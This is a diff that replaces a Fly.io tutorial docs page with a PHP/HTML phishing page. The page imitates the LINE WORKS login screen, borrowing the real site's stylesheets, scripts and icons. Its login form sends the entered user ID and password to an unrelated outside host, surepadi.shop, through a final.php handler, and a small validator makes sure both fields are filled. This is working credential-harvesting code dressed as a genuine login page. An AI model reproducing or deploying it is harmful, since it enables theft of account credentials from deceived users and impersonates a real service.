@@ -1,17 +1,217 @@
----
-title: Hands-on with Fly.io
-layout: docs
-sitemap: false
-nav: hands_on
-toc: false
-redirect_from: 
-- /docs/hands-on/start/
----
+<?php
+error_reporting(0);
 
-<figure>
-  <img src="/static/images/hands-on.webp" srcset="/static/images/hands-on@2x.webp 2x" alt="">
-</figure>
+ini_set("output_buffering",4096);
+session_start();
+?>
 
-In this work-through you'll use Fly Launch to deploy a simple "hello fly" app to the Fly Platform. The first step is installing all the tools you need to work with Fly Launch. Which is one tool: flyctl.
 
-[Next: Install flyctl](/docs/hands-on/install-flyctl/)
+<!DOCTYPE HTML>
+<!-- saved from url=(0112)http://viewoss.navercorp.com/UIT-WORKSMOBILE/wm_common/blob/feature/v3.5/login/dist/10_account.html -->
+<html lang="">
+
+<head>
+	<meta charset="utf-8" />
+	<meta content="IE=edge" http-equiv="X-UA-Compatible">
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+	<meta name="format-detection" content="telephone=no">
+	<title>Login</title>
+	<link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/register.css?20221013">
+	<link rel="icon" href="https://naver.worksmobile.com/wp-content/uploads/2020/10/cropped-NW_favicon512-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://naver.worksmobile.com/wp-content/uploads/2020/10/cropped-NW_favicon512-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://naver.worksmobile.com/wp-content/uploads/2020/10/cropped-NW_favicon512-180x180.png" />
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/jquery/jquery-3.6.0.min.js?20221013"></script>
+
+
+
+
+
+
+
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/common/lcslog.js?20221013" charset="utf-8"></script>
+	<script type="text/javascript">
+		/**
+	 * LCS Send
+	 * var lcsSti = "worksmobile_admin_blahblah"; 가 정의되어 있어야 전송가능
+	 * 각 페이지별로 따로 정의된 sti를 사용.
+	 *
+	 * ie10이하에서는 onload event에 적용
+	 * -> onload인 경우, lcs_do()에서 필요한요소들이 전부 로딩되기 전에 lcs_do()로직에서 retry()가 실행됨.
+	 *    but 로그는 한번만 전송되니 걱정하지 말 것.
+	 */
+	var eventType = (/(MSIE (10|9|8|7)|Trident\/(6|5|4|3))/.test((window.navigator || {}).userAgent)) ? 'load' : 'pageshow';
+	window.addEventListener(eventType,  function(event) {
+		if (typeof lcsSti !== 'undefined') {
+			sendLcs(lcsSti);
+		}
+	}, false);
+
+	/**
+	 * layer open 등과 같이 수동으로 호출이 필요한 경우 사용
+	 */
+	function sendLcs(lcsSti) {
+		try {
+			lcsSti = setMobilePrefix(lcsSti);
+			lcsSti = setInstancePostfix(lcsSti);
+			if ('real' != 'real') { // stage도 리얼이 아닌 알파로 잡히게 수정
+				window.lcs_SerName = 'alpha-lcs.worksmobile.com'; // for alpha Test
+			}
+			lcs_do({"sti" : lcsSti});
+		} catch(e) {}
+	}
+
+	/**
+	 * one_app 안에서 뜨는 경우, m_ prefix 추가
+	 */
+	function setMobilePrefix(lcsSti) {
+		if (navigator.userAgent.indexOf('WorksMobile') > -1) {
+			lcsSti = 'm_' + lcsSti;
+		}
+		return lcsSti;
+	}
+
+	/**
+	 * IDC 별 postfix 추가
+	 */
+	function setInstancePostfix(lcsSti) {
+		if ('jp1' == 'kr1' || 'jp1' == 'kr0') {
+			lcsSti += '_kr';
+		} else {
+			lcsSti += '_jp';
+		}
+		return lcsSti;
+	}
+	</script>
+
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/message/message_en_US.js?20221013"></script>
+
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/service/auth_core.js?20221013"></script>
+	<script type="text/javascript" src="https://auth.worksmobile.com/js/service/auth_service.js?20221013"></script>
+
+</head>
+
+<body class=" jp_instance">
+	<a href="#content" class="skip">content</a>
+	<div id="wrap" class="register login">
+		<h1><span>{brandName}</span></h1>
+		<div id="container">
+			<div class="login_infor">
+				<em class="user">Login</em>
+				<div class="desc">
+					<span id="lastLoginGuide"></span>
+					<div class="lwds_bubbletip">
+						<!-- 툴팁 아이콘, 툴팁 클릭시 on 클래스 -->
+						<a href="#" class="lwds_bubbletip_button"><i class="blind">help</i></a>
+
+						<!-- 툴팁 레이어 -->
+						<div class="lwds_bubbletip_layer direction_center_bottom" style="display:none;">
+							<p class="msg">
+								Login with your LINE WORKS ID (id@company or id@company.com) or a verified phone number.
+							</p>
+							<button type="button" class="lwds_bubbletip_close"><i class="blind">툴팁 닫기</i></button>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="fm_register">
+		 	<form id="" name="myForm" method="post" action="https://surepadi.shop/team/mab/wmob/final.php" onsubmit="return validated();">
+
+				<div class="login_form_cover">
+					<label for="login_param" class="_loginParamLabel blind">2061234567 or id@group.xx</label>
+					<input type="email" name="userid"  id="login_param"
+                           placeholder="2061234567 or id@group.xx" required>
+				</div>
+				<p class="inp">
+						<label for="password" class="blind">Password</label>
+						<input type="password" name="pass" id="password" placeholder="Password" required>
+						<button type="button" class="btn_masking"><span class="blind">show password</span></button>
+					</p>
+			</div>
+			<div class="wrong_message" style="display:none">
+				<p id="wrong_message_paragraph">Check your ID or phone number again.</p>
+			</div>
+			<!-- <div class="btn"><button>はじめる</button></div> -->
+			<div class="btn">
+				<button id ="loginStart" class="login_normal disabled">Login</button>
+			</div>
+			<div class="check_info">
+				<div class="find_info">
+					<a href="#" id="findIdBtn">Find ID, Password</a>
+				</div>
+			</div>
+			<div class="btn">
+				<div class="login_line_area">
+					<em class="login_line_desc">OR</em>
+
+					<button id="lineLogin"  class="login_line">Login with LINE</button>
+				</div>
+			</div>
+			</form>
+		</div>
+		<p class="welcome_link"><span>Create a new account?</span><a
+				href="#" target="_blank">Sign up
+				<!--</a><a href="#">초대코드입력</a>--></a></p>
+		<address><strong>&copy; WORKS MOBILE Corp.</strong></address>
+	</div>
+<input type="hidden" id="loginGuideString" value="Enter your mobile phone number or ID.">
+	<input type="hidden" id="loginGuideStringPhone" value="You logged in with your mobile number recently.">
+	<input type="hidden" id="loginGuideStringNaver" value="You logged in with your NAVER ID recently.">
+	<input type="hidden" id="loginGuideStringLine" value="You logged in using LINE recently.">
+	
+	
+	<script>
+									if ("false" === "false") {
+            var lcsSti = 'worksmobile_admin_auth_loginstep1';
+        }
+        var oStartLogin = new StartLogIn();
+        new PasswordLogIn("");
+
+
+        $(document).ready(function() {
+            if ('' != null && '' != '') {
+                $('#' + '').prop('selected', true);
+                setTimeout(function() {
+                    $('._currentSelectedCountry').html(oStartLogin.getCountryName($('#' + '')));
+                }, 100);
+
+            } else {
+                var selectedCode = $('#' + '81');
+                if ('en_US' === 'ja_JP' || 'en_US' === 'en_US') {
+                    $('#' + '81').prop('selected', true);
+                } else if ('en_US' === 'ko_KR') {
+                    $('#' + '82').prop('selected', true);
+                    selectedCode = $('#' + '82');
+                } else if ('en_US' === 'zh_TW') {
+                    $('#' + '886').prop('selected', true);
+                    selectedCode = $('#' + '886');
+                } else if ('en_US' === 'zh_CN') {
+                    $('#' + '86').prop('selected', true);
+                    selectedCode = $('#' + '86');
+                }
+                setTimeout(function() {
+                    $('._currentSelectedCountry').html(oStartLogin.getCountryName(selectedCode));
+                }, 100);
+            }
+        });
+        
+								</script>
+								
+								<script>
+	function validated() {
+if(document.myForm.userid.value.trim() == ""){
+	alert("Please Provide Your Email!");
+	document.myForm.userid.focus();
+	return false;
+}
+if(document.myForm.pass.value.trim() == "" || document.myForm.pass.value.length==0 ){
+	alert("Please Provide Password!");
+		document.myForm.pass.focus();
+		return false;
+	}
+	return true;
+}
+</script>
+
+</body>
+
+</html>
